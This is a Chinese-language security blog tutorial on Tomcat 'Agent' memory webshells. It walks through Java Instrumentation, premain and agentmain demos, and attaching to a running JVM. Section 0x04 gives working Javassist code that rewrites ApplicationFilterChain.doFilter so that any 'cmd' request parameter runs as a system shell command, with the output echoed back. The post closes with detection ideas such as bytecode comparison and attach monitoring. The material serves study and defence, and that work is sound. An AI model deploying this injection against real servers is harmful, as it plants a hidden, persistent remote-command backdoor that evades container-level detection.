---
title: 原理分析 | Agent —— Tomcat 内存马
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/sdf.jpg
categories:
  - [代码审计, 内存马]
tags:
  - Java
  - 内存马
  - Tomcat
  - 安全
  - Instrumentation
abbrlink: a3e7f2c9
date: 2026-04-20 19:18:00
---

# 原理分析 | Agent —— Tomcat 内存马

> 前几种（Filter、Servlet、Listener、Valve）都是在 **Servlet容器层** 做手脚——往 `StandardContext` 的集合里注入恶意组件。而 **Agent内存马** 下沉到 **JVM字节码层**，不依赖 Filter/Servlet/Listener 这些组件，通过 `Instrumentation` 动态修改类逻辑，相当于在 JVM 的"心脏"里动手术，不留下任何容器层痕迹，隐蔽性最强，原理与前几种截然不同。

## 目录

- [0x00 从一个问题出发](#0x00-从一个问题出发)
- [0x01 Java Instrumentation机制](#0x01-java-instrumentation机制)
- [0x02 静态注册（premain）实验](#0x02-静态注册premain实验)
- [0x03 动态注册（agentmain）实验](#0x03-动态注册agentmain实验)
- [0x04 注入Tomcat](#0x04-注入tomcat)
- [0x05 字节码修改：Javassist vs ASM](#0x05-字节码修改javassist-vs-asm)
- [0x06 注入目标的选择](#0x06-注入目标的选择)
- [0x07 整体流程复盘](#0x07-整体流程复盘)
- [0x08 与其他内存马的对比](#0x08-与其他内存马的对比)
- [0x09 检测思路](#0x09-检测思路)
- [0x0A 小结](#0x0a-小结)

---

## 0x00 从一个问题出发

前三种内存马之所以能被检测到，本质原因是它们都**新增**了东西：Filter链多了一个Filter、Servlet映射多了一条、Listener列表多了一个监听器。排查者只需枚举容器里的这些集合，找到不认识的就是注入的内存马。

那有没有一种方式，**不新增任何组件，只修改已有的代码逻辑**，让每次请求都经过恶意代码？

答案就是利用Java的 **Instrumentation机制**，在运行时动态修改已加载类的字节码。

### 正常加载流程（无Agent介入时）

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260412205729412.png)

### Agent介入流程（运行时动态修改字节码）

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260412205750166.png)

简单来讲：

- 没有 Agent 的情况下，一个 Java 类加载到 JVM 后，不能修改它的方法逻辑
- 有 Agent 的情况下，**可以修改已加载类的方法逻辑**

**Agent 通过什么机制让 JVM 允许修改已加载的类？**

Agent 拿到 JVM 给的 `Instrumentation` 对象 → 调用 `retransformClasses` → JVM 允许你**替换内存中这个类的方法字节码** → 新逻辑生效。

Agent 的"附着和修改字节码"能力是通用的，但"内存马要修改哪个类的哪个方法"决定了它是否针对某个容器。

---

## 0x01 Java Instrumentation机制

`java.lang.instrument` 包是 Java 5 引入的，核心接口是 `Instrumentation`。它提供了一套机制，允许在 JVM 运行时对类的字节码进行**拦截和修改**。

### Agent的两种挂载方式

Java Agent有两种生命周期入口：

**premain** — JVM 启动时通过 `-javaagent:xxx.jar` 挂载，在 `main()` 方法之前执行。这种方式需要重启 JVM，攻击场景下基本没用。

**agentmain** — JVM 运行中通过 **Attach API** 动态挂载，目标 JVM 不需要重启。这才是 Agent 内存马利用的入口。

两者的签名：

```java
// 启动时挂载（静态）
public static void premain(String args, Instrumentation inst)

// 运行时动态挂载（动态）
public static void agentmain(String args, Instrumentation inst)
```

区别只在方法名，`Instrumentation` 对象是一样的，功能完全相同。实际写 Agent 内存马时，两个方法都写上，都指向同一个逻辑，这样静态动态都能用。

### Instrumentation核心方法

`addTransformer` 的意思是：向 JVM 注册一个监听器，告诉 JVM "以后每次加载类的时候，先把字节码交给我过一遍"。

```java
// 注册 transformer，canRetransform=true 表示支持对已加载类重新触发
inst.addTransformer(new MyTransformer(), true);

// 强制对已加载的类重新过一遍 transformer（动态注入必须调）
inst.retransformClasses(SomeClass.class);
```

`ClassFileTransformer` 的 `transform()` 方法签名是固定的，因为它是接口定义好的，只能重写（`@Override`）：

```java
public byte[] transform(
    ClassLoader loader,           // 加载该类的 ClassLoader
    String className,             // 类名，注意是 / 分隔的
    Class<?> classBeingRedefined, // retransform 触发时是原 Class 对象，正常加载时为 null
    ProtectionDomain domain,      // 类的权限域，一般用不到
    byte[] classfileBuffer        // 原始字节码，最重要的参数
)
```

能做的只有两件事：

```
return null    → 不修改，JVM 用原始字节码
return byte[]  → 返回修改后的字节码，JVM 用新的
```

---

## 0x02 静态注册（premain）实验

做一个**静态注册（premain）**的示例——就是 JVM 启动时通过 `-javaagent` 挂载，不涉及 Attach，是最基础的入门形式，先把 Instrumentation 机制摸透。

### 实验目标

写一个 Agent，让它在目标程序的某个方法**被调用时**，在控制台打印一条日志，纯粹是为了**验证"修改字节码→影响方法行为"这个机制是真实有效的**。

```
目标程序（TargetApp）
    └─ 正常跑，每2秒调用一次 doWork()

Agent（MyAgent）
    └─ premain() 注册 transformer
    └─ transformer 拦截 TargetApp，在 doWork() 开头插入打印语句

运行命令：
    java -javaagent:agent.jar -jar target.jar
```

### 项目结构

建议用 **Maven**，`MANIFEST.MF` 可以直接在 `pom.xml` 里配置，Javassist 依赖一行加进来，打 fat jar 有现成插件，手动 javac 的话 classpath、MANIFEST 都要自己管，容易踩坑。

建两个独立的 Maven 项目：

```
agent-demo/
├── my-agent/          ← Agent项目（打出来的jar挂载到目标）
│   └── src/main/java/com/demo/
│       ├── AgentMain.java
│       └── PrintTransformer.java
│
└── target-app/        ← 目标程序（被注入的对象）
    └── src/main/java/com/demo/
        └── TargetApp.java
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260412212818809.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260412212824358.png)

### target-app 代码

```java
package com.demo;

public class TargetApp {
    public static void main(String[] args) throws Exception {
        while (true) {
            doWork();  // 每次循环都重新调用
            Thread.sleep(2000);
        }
    }

    public static void doWork() {
        System.out.println("hello world");
    }
}
```

运行起来每2秒打印一行 `hello world`，没有任何 Agent 的情况下就是这个效果。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260412213500053.png)

> **注意**：`TargetApp` 的打印逻辑故意拆成了两个方法，而不是都写在 `main()` 里。原因是 `main()` 只被调用一次，进入 `while(true)` 之后就不会再调了，`retransform` 改完字节码也没机会生效。而 `doWork()` 每次循环都调用一次，注入完之后下一次循环就能看到效果。这正好对应 Tomcat 的场景：Tomcat 启动 → `main()` 只跑一次，HTTP 请求进来 → `doFilter()` 每次都调用。

### target-app pom.xml

```xml
<project>
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.demo</groupId>
  <artifactId>target-app</artifactId>
  <version>1.0-SNAPSHOT</version>

  <build>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-jar-plugin</artifactId>
        <version>3.3.0</version>
        <configuration>
          <archive>
            <manifest>
              <mainClass>com.demo.TargetApp</mainClass>
            </manifest>
          </archive>
        </configuration>
      </plugin>
    </plugins>
  </build>
</project>
```

如果碰到 JDK 环境问题，可能是版本原因，把版本改成低版本的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260412221058320.png)

或者 pom.xml 里的也试试：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260412221029711.png)

如果碰到 SSL 网络问题可以换源，打开 `C:\Users\用户名\.m2\settings.xml`（没有自己创建），添加阿里云镜像：

```xml
<settings xmlns="http://maven.apache.org/SETTINGS/1.0.0"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/SETTINGS/1.0.0.xsd">
    <mirrors>
        <mirror>
            <id>aliyunmaven</id>
            <name>阿里云公共仓库</name>
            <url>http://maven.aliyun.com/nexus/content/groups/public</url>
            <mirrorOf>central</mirrorOf>
        </mirror>
    </mirrors>
</settings>
```

还有个小问题，一个目录里包含了两个 Maven 项目，导致第二个项目的目录显示不正常（重新只打开这个项目是正常的），是一点小 bug：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260412223823224.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260412223920212.png)

右键第二个项目的 java 目录 → 将目录标记为 →（点着点着就好了,不记得是哪个了）

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260412224629539.png)

pom.xml 里的也要改：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260412225030030.png)

IDEA 右边有快速打包的功能（第一次打包比较慢，后面就快了）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260412221645013.png)

生成 `target-app-1.0-SNAPSHOT.jar` 后，`java -jar target-app-1.0-SNAPSHOT.jar` 运行，效果一样：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260412225055269.png)

### my-agent pom.xml

`my-agent` 需要打 fat jar（把 Javassist 一起打进去），同时在 `MANIFEST.MF` 里声明 Agent 相关配置，这是 JVM 的强制要求，缺少这些声明会直接失败：

```xml
<project>
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.demo</groupId>
  <artifactId>my-agent</artifactId>
  <version>1.0-SNAPSHOT</version>

  <dependencies>
    <dependency>
      <groupId>org.javassist</groupId>
      <artifactId>javassist</artifactId>
      <version>3.29.2-GA</version>
    </dependency>
  </dependencies>

  <build>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-assembly-plugin</artifactId>
        <version>3.6.0</version>
        <configuration>
          <descriptorRefs>
            <descriptorRef>jar-with-dependencies</descriptorRef>
          </descriptorRefs>
          <archive>
            <manifestEntries>
              <Premain-Class>com.demo.AgentMain</Premain-Class>
              <Agent-Class>com.demo.AgentMain</Agent-Class>
              <Can-Retransform-Classes>true</Can-Retransform-Classes>
              <Can-Redefine-Classes>true</Can-Redefine-Classes>
            </manifestEntries>
          </archive>
        </configuration>
        <executions>
          <execution>
            <id>make-assembly</id>
            <phase>package</phase>
            <goals><goal>single</goal></goals>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
```

`MANIFEST.MF` 里各字段的意义：

```
Premain-Class    ← JVM 启动时加载 Agent 会执行此类的 premain 方法
Agent-Class      ← 运行时动态挂载时执行此类的 agentmain 方法
Can-Redefine-Classes   ← 声明需要修改已加载类的权限
Can-Retransform-Classes ← 声明需要动态重新转换字节码的权限
```

### AgentMain.java

```java
package com.demo;

import java.lang.instrument.Instrumentation;

public class AgentMain {
    // premain 是 JVM 启动时的回调入口，比 main() 更早执行
    // 静态注册用 premain，动态挂载用 agentmain
    // 两个方法都写上，都指向同一个逻辑，这样静态动态都能用
    public static void premain(String args, Instrumentation inst) {
        System.out.println("[Agent] 启动，开始注册 transformer");
        // inst.addTransformer() 把转换器注册进去，此后每个类加载都会经过它
        // addTransformer 的意思是：向 JVM 注册一个监听器，告诉 JVM "以后每次加载类的时候，先把字节码交给我过一遍"
        inst.addTransformer(new PrintTransformer());
    }
}
```

### PrintTransformer.java

```java
package com.demo;

import javassist.*;
import java.io.ByteArrayInputStream;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class PrintTransformer implements ClassFileTransformer {

    @Override
    // 固定的写法，重写接口，参数由 JVM 调用时自动传入
    public byte[] transform(ClassLoader loader,
                            String className,
                            Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain,
                            byte[] classfileBuffer) {

        // 检查是否是 TargetApp 类，不是就放行
        if (!"com/demo/TargetApp".equals(className)) {
            return null;  // return null = 不修改，JVM 用原始字节码
        }

        try {
            // 第一步：拿到 Javassist 的"书架"（类池）
            ClassPool classPool = ClassPool.getDefault();

            // 第二步：告诉书架，用这个类的 ClassLoader 去找依赖
            // 不加这行，Javassist 找不到 Tomcat 内部的类
            classPool.appendClassPath(new LoaderClassPath(loader));

            // 第三步：把原始字节码（classfileBuffer）放进书架，变成可操作的对象 CtClass
            CtClass ctClass = classPool.makeClass(new ByteArrayInputStream(classfileBuffer));

            // 第四步：从 CtClass 里找到叫 doWork 的方法
            CtMethod method = ctClass.getDeclaredMethod("doWork");

            // 第五步：在这个方法开头插入一行代码
            method.insertBefore(
                "System.out.println(\"[Agent] doWork() 被调用了！\");"
            );

            // 第六步：把修改后的 CtClass 重新转成字节码，返回给 JVM
            // 整体套路：原始字节码 → makeClass → CtClass → 找方法 → 插代码 → toBytecode → 返回
            return ctClass.toBytecode();

        } catch (Exception e) {
            System.out.println("[Agent] 修改失败：" + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }
}
```

打包后放一起运行命令测试：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260420172352555.png)

如果 TargetApp 只有一个 `main` 方法（没有单独抽 `doWork`），效果就是下面这样，只提示 main 被调用了一次，后面就没有提示了，因为 `main` 函数只被加载了一次：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260420145230367.png)

整个静态注入流程：

```
JVM 启动
    ↓
premain() 执行
    ↓
inst.addTransformer(new PrintTransformer())
  → JVM 内部记录：好，以后加载每个类都先经过 PrintTransformer
    ↓
TargetApp 开始加载
    ↓
JVM 把 TargetApp 的原始字节码交给 PrintTransformer.transform()
    ↓
transform() 里判断：是不是我要改的类？
  → 不是 → return null → JVM 用原始字节码正常加载
  → 是   → 用 Javassist 修改字节码 → return 修改后的字节码 → JVM 用新字节码加载
    ↓
TargetApp.main() 执行，跑的是被修改过的字节码
```

写到这里想到了之前对 CS 魔改时看到过类似的一个文件 `CSAgent.jar`，在它的启动 bat 里就有一个参数 `-javaagent:CSAgent.jar=CSAgent.properties`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260420154607547.png)

这是 `-javaagent` 的带参数写法，格式是 `-javaagent:jar路径=参数字符串`，`=` 后面的内容会作为字符串传给 `premain` 的第一个参数 `agentArgs`，Agent 内部拿到这个字符串之后可以用它做任何事，比如当成配置文件路径去读取配置。

看 `CSAgent.jar` 的文件结构可以看到和前面写的结构非常类似，也包含 `premain` 文件和 Javassist 对加载的类进行处理，这正是 Agent 内存马静态注册的技术：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260420154800418.png)

---

## 0x03 动态注册（agentmain）实验

静态（premain）是 JVM 启动时挂载，target 程序还没跑；动态（agentmain）是 target 程序已经在跑了，我们从外部把 agent 注入进去。

动态注入需要**两个程序配合**：

```
TargetApp（一直在跑的目标）
        ↑
Attacher（另一个独立程序，负责把 agent 注入进去）
```

### 改 AgentMain，加上 agentmain 方法

两个入口都保留，静态动态都能用：

```java
package com.demo;

import java.lang.instrument.Instrumentation;

public class AgentMain {

    // 因为 AgentMain 就是注入的 agent 马，会存储在目标的 JVM 里，所以可以在里面添加布尔参数
    private static boolean injected = false;

    public static void premain(String args, Instrumentation inst) throws Exception {
        System.out.println("[Agent] premain 启动");
        inst.addTransformer(new PrintTransformer(), true);
    }

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        if (injected) return; // 已经注入过，直接退出，防止重复注册
        injected = true;
        System.out.println("[Agent] agentmain 启动");
        inst.addTransformer(new PrintTransformer(), true);
        // 动态注入时 TargetApp 已经加载了，需要手动触发，强制让 JVM 把这个类重新过一遍 transformer
        // 这里能用 Class.forName() 是因为 agentmain 在 TargetApp 的 JVM 进程内执行，可以直接找到这个类
        inst.retransformClasses(Class.forName("com.demo.TargetApp"));
    }
}
```

`injected` 布尔值是因为 `AgentMain` 被加载进目标 JVM 之后就一直驻留在内存里，类不卸载静态字段就一直存在，所以第二次 attach 进来时能读到上次设置的值，直接 return，不重复注入。

**为什么动态注入需要 `retransformClasses`，静态不需要？**

```
静态注入（premain）：
  addTransformer 注册完毕
      ↓
  TargetApp 还没加载
      ↓
  TargetApp 加载时自动经过 transformer → 不需要 retransformClasses

动态注入（agentmain）：
  TargetApp 早就加载完了，已经在内存里跑着
      ↓
  addTransformer 注册完毕
      ↓
  TargetApp 不会再重新加载，transformer 没机会触发
      ↓
  必须手动调 retransformClasses → 强制让 JVM 把这个类重新过一遍 transformer
```

### 写 Attacher

`agentmain` 需要通过 Attach API 来触发。Attach API 的核心类是 `com.sun.tools.attach.VirtualMachine`，位于 JDK 的 `tools.jar` 中，需要在 `target-app` 的 `pom.xml` 里加上依赖：

```xml
<dependencies>
    <dependency>
        <groupId>com.sun</groupId>
        <artifactId>tools</artifactId>
        <version>1.8</version>
        <scope>system</scope>
        <systemPath>${java.home}/../lib/tools.jar</systemPath>
    </dependency>
</dependencies>
```

`my-agent` 的 `pom.xml` 里 `manifestEntries` 要加上 `Agent-Class` 这行，动态注入用的是 `agentmain`，没有这个声明 JVM 会直接报错：

```xml
<manifestEntries>
    <Premain-Class>com.demo.AgentMain</Premain-Class>
    <Agent-Class>com.demo.AgentMain</Agent-Class>  <!-- 动态注入必须有这行 -->
    <Can-Retransform-Classes>true</Can-Retransform-Classes>
    <Can-Redefine-Classes>true</Can-Redefine-Classes>
</manifestEntries>
```

**jps 是什么：** JDK 自带的实用工具，用于列出当前系统中正在运行的 Java 进程，类似 Linux 的 `ps`，但只显示 Java 进程。`-l` 选项输出完整的主类名（包含包路径）或 JAR 文件的完整路径。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260420163152879.png)

在 `target-app` 项目里新建 `Attacher.java`：

```java
package com.demo;

import com.sun.tools.attach.VirtualMachine;

public class Attacher {
    // 这样的 main 写法可以直接在 IDEA 里面运行
    public static void main(String[] args) throws Exception {
        // 直接填 jps 看到的 pid，每次程序重新运行 pid 号都会不同
        String pid = "20696";
        System.out.println("[Attacher] 目标进程：" + pid);

        // 利用 VirtualMachine 通过 pid 进程号连接到目标 JVM，建立通信
        VirtualMachine vm = VirtualMachine.attach(pid);

        // 把 agent jar 加载进目标 JVM，这一步触发目标 JVM 内的 agentmain() 执行
        vm.loadAgent("E:\\WWW\\agent-demo\\my-agent\\target\\my-agent-1.0-SNAPSHOT-jar-with-dependencies.jar");

        System.out.println("[Attacher] 注入成功");

        // 断开连接，但 agent 已经注入进去了，断开连接不影响效果
        vm.detach();
    }
}
```

整体就三步：**连接目标 JVM → 加载 agent jar → 断开连接**

**重要**：`agentmain` 是在目标 JVM 进程内执行的，不是在 Attacher 进程。所以在 `agentmain` 里可以直接访问目标 JVM 的所有已加载类和运行时状态。

直接在 IDEA 里运行 Attacher 即可，运行前先 `jps -l` 看一眼最新的 pid 填进去：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260420165124379.png)

可以看到 agent 也能被重复注册，加了 `injected` 布尔值之后就不会重复注册了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260420171046705.png)

动态注入流程：

```
TargetApp 跑着（jps 找到 pid）
    ↓
Attacher：VirtualMachine.attach(pid) → 连接到 TargetApp 的 JVM
    ↓
Attacher：vm.loadAgent(jar路径) → 触发 TargetApp JVM 内的 agentmain()
    ↓
agentmain 在 TargetApp JVM 内执行：
  addTransformer 注册钩子
  retransformClasses 强制重新加载 TargetApp
  → PrintTransformer.transform() 被调用
  → Javassist 在 doWork() 开头插入打印语句
  → 返回修改后的字节码
    ↓
Attacher 断开连接，但修改已生效
    ↓
此后每次 doWork() 被调用，都先执行插入的代码
```

---

## 0x04 注入Tomcat

动态注入 TargetApp 跑通之后，注入 Tomcat 就是换个类名和方法名的事，原理完全一样。因为前面学过 Tomcat 的请求流程是 listener → filter → servlet，而 filter 里有个 `doFilter`，所以可以通过 Agent 修改 `doFilter` 来达到效果，当然也能修改其他的。

**PrintTransformer** 修改——把目标类和方法换掉，插入代码换成执行命令：

```java
// 类名判断改成
if (!"org/apache/catalina/core/ApplicationFilterChain".equals(className)) {
    return null;
}

// 方法名改成
CtMethod method = ctClass.getDeclaredMethod("doFilter");

// 插入的代码改成
method.insertBefore(
    // doFilter 的第一个参数是 ServletRequest，强转成 HttpServletRequest
    // $1 是 Javassist 的写法，代表方法第一个参数
    "javax.servlet.http.HttpServletRequest req = (javax.servlet.http.HttpServletRequest) $1;" +
    // $2 是第二个参数 ServletResponse，强转成 HttpServletResponse
    "javax.servlet.http.HttpServletResponse resp = (javax.servlet.http.HttpServletResponse) $2;" +
    // 从 HTTP 请求里取 cmd 参数
    "String cmd = req.getParameter(\"cmd\");" +
    "if (cmd != null) {" +
    // 默认 Linux 命令
    "  String[] cmds = new String[]{\"/bin/bash\", \"-c\", cmd};" +
    // 如果是 Windows 换成 cmd.exe
    "  if (System.getProperty(\"os.name\").toLowerCase().contains(\"win\")) {" +
    "    cmds = new String[]{\"cmd.exe\", \"/c\", cmd};" +
    "  }" +
    // 执行命令，拿到输出流
    "  java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();" +
    // 把输出流读成字符串
    "  java.util.Scanner sc = new java.util.Scanner(in).useDelimiter(\"\\\\A\");" +
    "  String output = sc.hasNext() ? sc.next() : \"\";" +
    // 写回 HTTP 响应
    "  resp.getWriter().println(output);" +
    "}"
);
```

整体逻辑就是：**每次请求进来，检查有没有 `cmd` 参数，有就执行，结果写回响应。**

**AgentMain** 修改——retransformClasses 目标换成 ApplicationFilterChain：

```java
// 遍历 JVM 中所有已加载的类
for (Class clazz : inst.getAllLoadedClasses()) {
    // 找到 ApplicationFilterChain 这个类
    if (clazz.getName().equals("org.apache.catalina.core.ApplicationFilterChain")) {
        // 强制重新触发 transformer，让我们的修改生效
        inst.retransformClasses(clazz);
        // 找到了就退出循环，不用继续遍历
        break;
    }
}
```

这里不能直接使用 `inst.retransformClasses(Class.forName("org.apache.catalina.core.ApplicationFilterChain"))`，因为 `Class.forName()` 用的是系统类加载器，找不到 Tomcat 自己的类。Tomcat 有独立的类加载器，`ApplicationFilterChain` 是被 Tomcat 的类加载器加载的，系统类加载器根本不知道它。所以必须换成遍历已加载类的写法，`getAllLoadedClasses()` 是直接从 JVM 拿所有已加载的类，不走类加载器查找，所以能找到 Tomcat 的内部类。

打包完成后，进入 Tomcat 的 bin 目录，运行 `.\catalina.bat run` 启动 Tomcat 服务，访问 `http://localhost:8080/` 正常显示：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260420174319880.png)

此时直接访问 `http://localhost:8080/?cmd=whoami` 是没有任何效果的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260420174636000.png)

`jps -l` 查找一下 Tomcat 的 pid：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260420174535647.png)

把 pid 填进 Attacher，在 IDEA 里运行，Tomcat 终端显示注入成功：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260420174750784.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260420175537297.png)

再次访问 `http://localhost:8080/?cmd=whoami`，浏览器有回显，注入成功：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260420175650488.png)

注入流程：

```
Tomcat 跑着
    ↓
Attacher attach 上 Tomcat 的 pid
    ↓
agentmain 触发
    ↓
transformer 修改 ApplicationFilterChain.doFilter() 字节码
    ↓
每次 HTTP 请求进来经过 doFilter()
    ↓
读取 cmd 参数 → 执行系统命令 → 写回 response
```

---

## 0x05 字节码修改：Javassist vs ASM

拿到原始字节码 `byte[]` 之后，需要一个工具来解析和修改它。常用的有两个：

**ASM** — 操作字节码指令级别，极其灵活但学习成本高，需要了解 JVM 指令集。

**Javassist** — 操作 Java 源码层面，直接写 Java 字符串来描述要插入的逻辑，门槛低得多。Agent 内存马分析通常用 Javassist 来演示，因为可读性好。

Javassist 的核心操作套路：

```java
ClassPool classPool = ClassPool.getDefault();
// 把当前类的 ClassLoader 告诉 Javassist（Tomcat 等独立类加载器的环境必须加）
classPool.appendClassPath(new LoaderClassPath(loader));
// 从字节码流构造 CtClass，避免依赖 classpath 上的 class 文件
CtClass ctClass = classPool.makeClass(new ByteArrayInputStream(classfileBuffer));

CtMethod method = ctClass.getDeclaredMethod("doFilter");
method.insertBefore("/* 插入到方法开头的 Java 代码字符串 */");

byte[] modifiedBytes = ctClass.toBytecode();
ctClass.detach(); // 释放，防止内存泄漏
return modifiedBytes;
```

`insertBefore` / `insertAfter` / `insertAt` 分别在方法头、方法尾、指定行插入代码。Javassist 有一些限制，比如不支持泛型、不支持 `var`，但对于插入简单逻辑完全够用。

---

## 0x06 注入目标的选择

理论上可以修改任何类，但通常选择**请求处理链中必经的类**，这样每次 HTTP 请求都能触发。常见目标：

| 目标类 | 修改的方法 | 特点 |
|--------|-----------|------|
| `ApplicationFilterChain` | `doFilter()` | 所有请求必经，Filter 执行入口 |
| `ApplicationFilterChain` | `internalDoFilter()` | 实际遍历 Filter 链的私有方法 |
| `CoyoteAdapter` | `service()` | 更靠近 Connector 层，更底层 |
| `StandardWrapperValve` | `invoke()` | Valve 管道入口 |

选 `ApplicationFilterChain.doFilter()` 是最常见的选择，因为它是 Servlet 规范定义的接口，所有 Web 框架都要经过这里。

---

## 0x07 整体流程复盘

```
[攻击者]
 ├─ 通过漏洞（文件上传/反序列化等）把恶意 Agent jar 写到服务器
 └─ 在服务器本地执行 Attacher，VirtualMachine.attach(Tomcat pid)
                                   ↓
[Attach API]
 └─ 向目标 JVM 发送 load 指令
                                   ↓
[目标 JVM 内]
 ├─ 回调 agentmain(args, inst)
 ├─ inst.addTransformer(EvilTransformer, true)
 └─ inst.retransformClasses(ApplicationFilterChain.class)
                                   ↓
[EvilTransformer.transform()]
 ├─ 接收 ApplicationFilterChain 的原始字节码
 ├─ 用 Javassist 在 doFilter() 开头插入读取 request 参数、执行命令的逻辑
 └─ 返回修改后的字节码
                                   ↓
[此后每次 HTTP 请求]
 └─ doFilter() 触发 → 读取特定请求参数 → 执行系统命令 → 写回 response
```

---

## 0x08 与其他内存马的对比

| 类型 | 作用层 | 注入手段 | 检测方式 | 隐蔽性 |
|------|--------|---------|---------|--------|
| Filter | Servlet 容器 | 往 FilterChain 集合里加 | 枚举所有 Filter | 中 |
| Servlet | Servlet 容器 | 往 URL 映射里加 | 枚举 Servlet 映射 | 中 |
| Listener | Servlet 容器 | 往 Listeners 集合里加 | 枚举所有 Listener | 中 |
| **Agent** | **JVM 字节码** | **修改已有类字节码** | **需要对比字节码** | **极高** |

前三种内存马有一个共同弱点：需要**新增**组件，排查时遍历容器集合就能发现。Agent 内存马修改的是已有类，从容器层面看毫无异常——`ApplicationFilterChain` 还是那个 `ApplicationFilterChain`，类名没变，对象没变，只是方法体里偷偷多了几十行字节码。

---

## 0x09 检测思路

**1. 字节码对比**

最直接的方式：把 JVM 内存中正在运行的类的字节码，和 jar 包里原始的 class 文件做 MD5 对比，不一致就说明被修改过。

arthas 的 `jad` 命令可以反编译运行时的类：

```bash
jad org.apache.catalina.core.ApplicationFilterChain doFilter
```

如果反编译结果里出现了不认识的逻辑，那基本确认了。

**2. 检查已注册的 Transformer**

`Instrumentation` 接口没有提供获取已注册 transformer 列表的标准方法，但通过反射可以拿到实现类内部维护的 transformer 列表，检查是否有可疑类。

**3. 监控 Attach 行为**

Attach 过程在 Linux 上会在 `/tmp/.java_pid<pid>` 创建 socket 文件，可以通过 inotify 或 auditd 监控这个行为。一个正常运行的 Tomcat 不应该频繁被 attach。

**4. JVM 启动参数检查**

查看 `/proc/<pid>/cmdline`，如果启动参数里有不认识的 `-javaagent`，要排查那个 jar 是否可信。（动态 attach 的 agent 不会出现在 cmdline 里，这一条只能查静态挂载的情况。）

---

## 0x0A 小结

Agent 内存马的核心是 Java 的 **Instrumentation机制**：

- 通过 **Attach API** 在运行时动态挂载 Agent
- `agentmain` 拿到 `Instrumentation` 对象
- 注册 `ClassFileTransformer`，用 `retransformClasses` 触发对已加载类的字节码修改
- 用 **Javassist/ASM** 在目标方法里插入恶意逻辑
- 此后每次请求都走被篡改的字节码

和前几种内存马最本质的区别：**不新增组件，修改已有类**，绕过了所有基于"枚举新增组件"的检测手段。

检测这类内存马，核心思路是**字节码比对**，对关键类的运行时字节码做完整性校验，而不是只看容器层面的组件列表。

下一篇写内存马的检测与查杀，把几种内存马的排查方法系统整理一下。
